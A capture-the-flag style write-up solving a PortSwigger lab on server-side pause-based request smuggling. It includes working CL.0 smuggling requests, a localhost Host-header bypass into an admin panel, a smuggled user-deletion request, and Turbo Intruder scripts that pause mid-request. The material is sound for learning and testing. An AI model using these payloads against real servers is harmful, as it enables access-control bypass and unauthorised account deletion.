# Server-side pause-based request smuggling

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync/lab-server-side-pause-based-request-smuggling), you'll learn: Server-side pause-based request smuggling! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

This lab is vulnerable to pause-based server-side request smuggling. The front-end server streams requests to the back-end, and the back-end server does not close the connection after a timeout on some endpoints.

To solve the lab, identify a pause-based CL.0 desync vector, smuggle a request to the back-end to the admin panel at `/admin`, then delete the user `carlos`.

> Note:
>  
> Some server-side pause-based desync vulnerabilities can't be exploited using Burp's core tools. You must use the [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) extension to solve this lab.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks#pause).

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226182416.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226182657.png)

In here, we see the response's `Server` header's value is `Apache/2.4.52`.

In Apache version 2.4.52, it's potentially vulnerable to ***pause-based CL.0 attacks*** on endpoints that trigger server-level redirects.

### Pause-based desync

Seemingly secure websites may contain hidden desync vulnerabilities that only reveal themselves if you pause mid-request.

Servers are commonly configured with a read timeout. If they don't receive any more data for a certain amount of time, they treat the request as complete and issue a response, regardless of how many bytes they were told to expect. Pause-based desync vulnerabilities can occur when a server times out a request but leaves the connection open for reuse. Given the right conditions, this behavior can provide an alternative vector for both server-side and client-side desync attacks.

### Server-side pause-based desync

You can potentially use the pause-based technique to elicit [CL.0](https://portswigger.net/web-security/request-smuggling/browser/cl-0)-like behavior, allowing you to construct server-side request smuggling exploits for websites that may initially appear secure.

This is dependent on the following conditions:

- The front-end server must immediately forward each byte of the request to the back-end rather than waiting until it has received the full request.
- The front-end server must not (or can be encouraged not to) time out requests before the back-end server.
- The back-end server must leave the connection open for reuse following a read timeout.

To demonstrate how this technique works, let's walk through an example. The following is a standard [CL.0 request smuggling](https://portswigger.net/web-security/request-smuggling/browser/cl-0) probe:

```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

Consider what happens if we send the headers to a vulnerable website, but pause before sending the body.

1. The front-end forwards the headers to the back-end, then continues to wait for the remaining bytes promised by the `Content-Length` header.
2. After a while, the back-end times out and sends a response, even though it has only consumed part of the request. At this point, the front-end may or may not read in this response and forward it to us.
3. We finally send the body, which contains a basic request smuggling prefix in this case.
4. The front-end server treats this as a continuation of the initial request and forwards this to the back-end down the same connection.
5. The back-end server has already responded to the initial request, so assumes that these bytes are the start of another request.

At this point, we have effectively achieved a CL.0 desync, poisoning the front-end/back-end connection with a request prefix.

We've found that servers are more likely to be vulnerable when they generate a response themselves rather than passing the request to the application.

### Testing for pause-based CL.0 vulnerabilities

It's possible to test for pause-based CL.0 vulnerabilities using Burp Repeater, but only if the front-end server forwards the back-end's post-timeout response to you the moment it's generated, which isn't always the case.

To test it, we can use the [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) extension as it lets you pause mid-request then resume regardless of whether you've received a response.

- In Burp Repeater, create a CL.0 request smuggling probe like we used in the example above, then send it to Turbo Intruder:

```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

- In Turbo Intruder's Python editor panel, adjust the request engine configuration to set the following options:

```py
concurrentConnections=1
requestsPerConnection=100
pipeline=False
```

- Queue the request, adding the following arguments to the `queue()` interface:

- `pauseMarker` - A list of strings after which you want Turbo Intruder to pause.
- `pauseTime` - The duration of the pause in milliseconds.

For example, to pause after the headers for 60 seconds, queue the request as follows:

```py
engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=60000)
```

- Queue an arbitrary follow-up request as normal:

```py
followUp = 'GET / HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n'
engine.queue(followUp)
```

- Ensure that you're logging all responses to the results table:

```py
def handleResponse(req, interesting):
    table.add(req)
```

When you first start the attack, you won't see any results in the table. However, after the specified pause duration, you should see two results. If the response to the second request matches what you expected from the smuggled prefix (in this case a 404), this strongly suggests that the desync was successful.

**Now, we can go to Burp Suite Repeater, and try sending a request for a valid directory without including a trailing slash:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226182855.png)

As you can see, it's redirecting us to `/resources/`.

**To exploit pause-based CL.0, we first create a CL.0 attack request:**
```http
POST /resources HTTP/1.1
Host: 0ad4008d0447beb8c01f2c810045009b.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

GET /admin/ HTTP/1.1
Host: 0ad4008d0447beb8c01f2c810045009b.web-security-academy.net


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226193518.png)

**Then, send that request to "Turbo Intruder":**

> Note: I tried to write a Python script to do that, however I wasn't able to send raw HTTP request. No idea why.

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226191721.png)

**Then modify the Python script to the following code:**
```py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=500,
                           pipeline=False
                           )

    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

This issues the request twice, pausing for 61 seconds after the `\r\n\r\n` sequence at the end of the headers.

**Launch the attack:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226191907.png)

Initially, you won't see anything happening, but after 61 seconds, you should see two entries in the results table:

- The first entry is the `POST /resources` request, which triggered a redirect to `/resources/` as normal:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226193723.png)

- The second entry is a response to the `GET /admin/` request:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226193803.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226193813.png)

Although this just tells you that the admin panel is only accessible to local users, this confirms the pause-based CL.0 vulnerability.

**To bypass the local restriction, we can try to add the `Host` header with value `localhost`:**
```http
Content-Length: 0

GET /admin/ HTTP/1.1
Host: localhost


```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226192339.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226193847.png)

**Then relaunch the attack and wait for 61 seconds:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226194040.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226194108.png)

This time we successfully bypassed the admin panel restriction!!

**Now, the admin panel has a HTML form:**
```html
<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
    <input required type="hidden" name="csrf" value="OPub21PuuzgPKd01kmApu3QktxGyRcjg">
    <label>Username</label>
    <input required type='text' name='username'>
    <button class='button' type='submit'>Delete user</button>
</form>
```

When the "Submit" button is clicked, **it'll send a POST request to `/admin/delete`, with parameter `csrf` and `username`.**

Armed with above information, we can delete user `carlos`!

**To do so, we need to modify the smuggled request:**
```http
Content-Length: 158

POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Type: x-www-form-urlencoded
Content-Length: 53

csrf=unSEDsbIWW4wAWKgLuWtazQUKSvfi6dP&username=carlos
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226200525.png)

**Also, we need to update `pauseMarker` argument, so that it only matches the end of the first set of headers:**
```py
pauseMarker=['Content-Length: 53\r\n\r\n']
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226194544.png)

**Then lanuch the attack again, and wait for 61 seconds:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/HTTP-Request-Smuggling/Smuggling-22/images/Pasted%20image%2020230226200417.png)

We successfully deleted user `carlos`!

# What we've learned:

1. Server-side pause-based request smuggling